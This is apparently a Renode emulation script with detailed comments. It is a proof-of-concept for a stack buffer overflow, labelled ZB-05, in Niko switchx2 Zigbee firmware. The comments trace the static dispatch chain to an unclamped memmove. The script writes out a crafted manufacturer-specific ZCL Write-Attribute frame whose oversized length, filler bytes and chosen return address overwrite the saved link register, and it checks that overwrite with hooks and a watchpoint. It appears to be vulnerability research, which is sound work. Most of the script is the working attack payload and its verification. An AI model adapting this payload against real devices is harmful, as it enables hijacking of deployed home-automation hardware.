:name: ZB-05 Niko switchx2 — ZCL-DISPATCH-INJECTION reachability PoC (SOURCE-side of dispatch -> SINK)
:description: Injects an ALREADY-DECRYPTED PLAINTEXT manufacturer-specific ZCL Write-Attribute frame (cluster 0xFC00, mfgCode 0x125F, command 0x02, attr id 0x0107, type 0x42 string) at the firmware's ZCL command dispatch entry sub_6482 and lets the Niko switchx2 firmware's OWN code parse the ZCL header, build the parse-context struct (sub_6406), classify it, and route it through the DIRECT static call chain sub_6482 -> j_sub_D290 (0x6a46 veneer) -> sub_D290, into case 0x107, whose unclamped memmove (0xd540, BL sub_696C) overflows a 4-byte local past the 60-byte gap to the saved LR. No PC is forced into the parser, the router, or the sink: only the dispatch ENTRY (sub_6482) is entered with the plaintext frame + the register/stack contract sub_c66a would set up. This closes two axes the function-level PoC (zb05_validate.resc, which forced PC=0xD290 with a hand-built context) skipped: (1) GATE REACHABILITY (the firmware's own ZCL header parse + cluster/mfgCode/attr classification routes the frame to sub_D290 case 0x107) and (2) PARAMETER FIDELITY (the attacker declared-length byte flows UNCLAMPED to the memmove).
#
# ============================ KEY RE FINDING ============================
#   The report warned ZB-05's dispatch to sub_D290 was a "RAM-based indirect
#   dispatch" (flash scan missed the handler). Disassembly shows this is WRONG:
#   the call into sub_D290 is a DIRECT STATIC chain, no function-pointer table:
#       sub_c66a  (0xc6e2:  bl sub_6482 -- ZCL command handler)
#         -> sub_6482 (0x6482: push{r1-r11,lr}; builds parse-context in the
#                      global ctx buffer @0x6908 via sub_6406; bl sub_62c8;
#                      0x64d4 mov r0,ctx; 0x64d6 bl 0x6a46)
#         -> 0x6a46 (b.w 0xd290 -- a bare veneer / j_sub_D290)
#         -> sub_D290 (0xd290)  r0 = parse-context struct.
#   So NO RAM dispatch-table pre-seed is needed; the routing is fully static.
#
# ============================ FORCED vs NATURAL ============================
#   FORCED (emulation scaffolding, minimal):
#     * The plaintext ZCL frame is written into scratch RAM and the CPU is entered
#       at sub_6482 (0x6482) with r0..r3 + two stack args exactly as sub_c66a would
#       pass them. This deliberately BYPASSES NWK/APS decryption, APS addressing,
#       and the endpoint/cluster affinity search ABOVE the ZCL command dispatch.
#       It proves "a frame that reaches ZCL command dispatch IS parsed, classified
#       and routed to the sink with attacker-controlled params", NOT the full
#       crypto-authenticated OTA path (which requires network-key membership).
#     * NO RAM dispatch-table pre-seed is required (unlike ZB-02): the dispatch is
#       a direct static call.
#   NATURAL (firmware's own execution, from sub_6482 down -- NO forced PC):
#     * sub_6406 parses the ZCL header from our frame bytes: mfg-specific bit =
#       (frame[0]>>2)&1 -> ctx[0x0f]; reads mfgCode = frame[1..2] (LE) -> ctx[0x10];
#       TSN = frame[3] -> ctx[0x12]; command id = frame[4] -> ctx[0x13];
#       record offset -> ctx[0x14]=5; payload ptr = frame -> ctx[0x08].
#     * sub_6482 stores the ctx as the "current command", calls sub_62c8, then
#       DIRECT-calls sub_D290(r0 = ctx).
#     * sub_D290 checks: ctx[0x13]==2 (Write Attributes), ctx[0x0f]!=0 (mfg-spec),
#       ctx[0x10]==0x125F (Niko mfgCode), frame-header[5] dir in {1,2},
#       cluster (frame-header[2])==0xFC00, then reads attr id 0x0107, type 0x42
#       (string). case 0x107 (0xd52a): value length = frame[8]+1 (UNCLAMPED),
#       memmove(dst=SP+0x10, src=record+3, len) at 0xd540 (BL sub_696C).
#     * dst is a 4-byte local; saved LR is at SP+0x4c (60 bytes away). declared
#       length 0x3F -> copy 64 bytes -> copied[60..63] overwrite the saved LR.
#       Epilogue 0xd6d2 `pop {r4-r11,pc}` would load the corrupted LR into PC.
#
# ============================ STACK / SENTINEL MATH ============================
#   Entry SP (fresh)                         = 0x20010000
#   sub_6482 push {r1-r11,lr} (48 bytes)     -> SP = 0x2000FFD0
#   bl 0x6a46 / b.w 0xd290 (no SP change)    -> sub_D290 entry SP = 0x2000FFD0
#   sub_D290 push {r4-r11,lr} (36 bytes)     -> SP = 0x2000FFAC; saved LR @ 0x2000FFCC
#   sub_D290 sub sp,#0x2c (44 bytes)         -> final SP = 0x2000FF80
#   memmove dst = final SP + 0x10            = 0x2000FF90; dst+60 = 0x2000FFCC = saved LR
#   => pre-place sentinel at 0x2000FFCC; expect overwrite to 0x20005001 (frame[68..71]).
# =======================================================================================

$bin=@scripts/silabs-vuln/zb05_niko.elf
include @scripts/silabs-vuln/boot_mg21.resc
logLevel 3
logLevel 3 sysbus.radio

# COLD hooks (each address executes once on this path -> no flooding).
cpu AddHook 0x6482  "self.ErrorLog('MARK_6482_ZCLDISP_ENTRY')"
cpu AddHook 0x6406  "self.ErrorLog('MARK_6406_CTXBUILD')"
cpu AddHook 0x62c8  "self.ErrorLog('MARK_62C8_PREPROC')"
cpu AddHook 0x6a46  "self.ErrorLog('MARK_6A46_VENEER')"
cpu AddHook 0xd290  "self.ErrorLog('MARK_D290_SINK_ENTRY')"
cpu AddHook 0xd52a  "self.ErrorLog('MARK_D52A_CASE107_CMP')"
cpu AddHook 0xd532  "self.ErrorLog('MARK_D532_CASE107_BODY')"
cpu AddHook 0xd540  "self.ErrorLog('MARK_D540_MEMMOVE_SINK')"
cpu AddHook 0xd6d2  "self.ErrorLog('MARK_D6D2_EPILOGUE_POP_PC')"

# Boot through clock/power/radio bring-up.
emulation RunFor "0.3"
pause
echo ">>> post-boot PC (expect advanced past reset/boot):"
cpu PC

# --- Zero scratch RAM (frame + stack region) -----------------------------------------
python "for a in range(0x20001000,0x20001300,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"
python "for a in range(0x2000FF00,0x20010010,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"

# --- Frame-header struct @0x20001100 (r0 arg -> ctx[0]) ------------------------------
#   [0x02]=cluster 0xFC00   [0x05]=direction 0x01
sysbus WriteDoubleWord 0x20001100 0xFC000000
sysbus WriteDoubleWord 0x20001104 0x00000100

# --- Plaintext ZCL Write-Attribute frame @0x20001200 (r2 arg) ------------------------
#   [0]=FC=0x04 (bit2 mfg-specific set, frame type profile-wide)
#   [1..2]=mfgCode 0x125F (LE 5F 12)   [3]=TSN 0x00   [4]=command 0x02 (Write Attributes)
#   [5..6]=attr id 0x0107 (LE 07 01)   [7]=type 0x42 (string)   [8]=declared len 0x3F
#   [9..67]=0x41 filler   [68..71]=saved-LR target 0x20005001 (LE 01 50 00 20)
sysbus WriteDoubleWord 0x20001200 0x00125F04
sysbus WriteDoubleWord 0x20001204 0x42010702
sysbus WriteDoubleWord 0x20001208 0x4141413F
sysbus WriteDoubleWord 0x2000120C 0x41414141
sysbus WriteDoubleWord 0x20001210 0x41414141
sysbus WriteDoubleWord 0x20001214 0x41414141
sysbus WriteDoubleWord 0x20001218 0x41414141
sysbus WriteDoubleWord 0x2000121C 0x41414141
sysbus WriteDoubleWord 0x20001220 0x41414141
sysbus WriteDoubleWord 0x20001224 0x41414141
sysbus WriteDoubleWord 0x20001228 0x41414141
sysbus WriteDoubleWord 0x2000122C 0x41414141
sysbus WriteDoubleWord 0x20001230 0x41414141
sysbus WriteDoubleWord 0x20001234 0x41414141
sysbus WriteDoubleWord 0x20001238 0x41414141
sysbus WriteDoubleWord 0x2000123C 0x41414141
sysbus WriteDoubleWord 0x20001240 0x41414141
sysbus WriteDoubleWord 0x20001244 0x20005001

# --- Incoming stack args for sub_6482 (sit at entry SP, above the push) --------------
#   arg5 @ [entrySP+0] -> ctx[0x06]  (non-zero: skips the ctx[6]==0 setup branch in sub_D290)
#   arg6 @ [entrySP+4] -> ctx[0x18]  (0: keeps sub_62c8 on its simple path)
sysbus WriteDoubleWord 0x20010000 0x00000001
sysbus WriteDoubleWord 0x20010004 0x00000000

# --- Pre-place saved-LR sentinel where sub_D290's saved LR will land ------------------
sysbus WriteDoubleWord 0x2000FFCC 0xAABBCCDD
echo ">>> BEFORE: saved-LR slot @0x2000FFCC (sentinel) ="
sysbus ReadDoubleWord 0x2000FFCC

# Watchpoint to catch the exact overflow write.
sysbus AddWatchpointHook 0x2000FFCC DoubleWord Write "self.ErrorLog('>>> WATCHPOINT: overflow wrote saved-LR slot 0x2000FFCC = 0x{0:X}'.format(value))"

# --- Register/stack contract sub_c66a would hand sub_6482 ----------------------------
#   r0 = frame-header ptr (-> ctx[0])   r1 = 0 (-> ctx[4])
#   r2 = ZCL frame ptr                  r3 = frame length 0x50
#   SP = fresh scratch stack            LR = 0xDEAD sentinel   PC = sub_6482
sysbus.cpu SetRegister 0  0x20001100
sysbus.cpu SetRegister 1  0x00000000
sysbus.cpu SetRegister 2  0x20001200
sysbus.cpu SetRegister 3  0x00000050
sysbus.cpu SetRegister 13 0x20010000
sysbus.cpu SetRegister 14 0x0000DEAD
sysbus.cpu PC 0x6482

# Let the firmware's OWN dispatch carry the frame down (bounded window).
emulation RunFor "0.002"
pause

echo ">>> AFTER: PC ="
cpu PC
echo ">>> AFTER: saved-LR slot @0x2000FFCC (expect 0x20005001) ="
sysbus ReadDoubleWord 0x2000FFCC
echo ">>> (see MARK_* above: 6482 -> 6406 -> 62C8 -> 6A46 -> D290 -> D52A -> D532 -> D540)"
quit
